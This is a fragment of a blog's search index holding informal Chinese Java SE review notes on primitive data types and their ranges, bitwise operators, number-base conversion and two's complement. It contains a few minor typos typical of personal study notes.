占用较小的一块内存空间，当执行Java方法时记录正在执行的虚拟机字节码指令地址，如果执行Native方法则计时器值为空。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>javaSE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——数据类型]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D 整数型（整数常亮默认为int类型） byte：占一个字节 -128 ~ 127 short：占两个字节 -2^15 ~ 2^15-1 int：占四个字节 -2^31 ~ 2^31-1 long：占八个字节 -2^63 ~ 2^63-1 浮点型（小数型，默认小数是double类型） float：占四个字节 -2^128 ~ 2^128 绝对保证精度6位，但有7位有效数字 double：占八个字节 -2^1024 ~ 2^1024 绝对保证精度15位，但有16位有效数字 字符型 char：占两个字节 0 ~ 65535 布尔型（判断） boolean：理论八分之一字节，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小 ps：float由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>数据类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——进制编码]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0 java中的数据表示法 在java中数据前面加 0x表示16进制 0b表示二进制 0表示8进制 进制转换 任何进制转10进制都是 每一位 第某位的数据 乘 被转换的进制数 的 第某位索引次幂 相加 例子八转10：10120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80 10进制转任何进制都是 除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上 2、8互转与2、16互转方法： 2转8 = 3位一组转8 8转2 = 每一位转2 2转16 = 4位一组转16 16转2 = 每一位转2 二进制快速转换10进制方法： 二进制：1 1 1 1 1 1 1 1 十进制：128 64 32 16 8 4 2 1 二进制表示法: 符号位0为正，1为负 计算机二进制运算原理 计算机二进制运算都是用补码 例子： +7 的原码是 0 0000111 ps：正数的、原码、反码、补码都一样 -7 的原码为 1 0000111 反码为 1 1111000 （符号位不变） 补码为 1 1111001（在反码的基础上加1）]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>进制编码</tag>
      </tags>
  </entry>
</search>
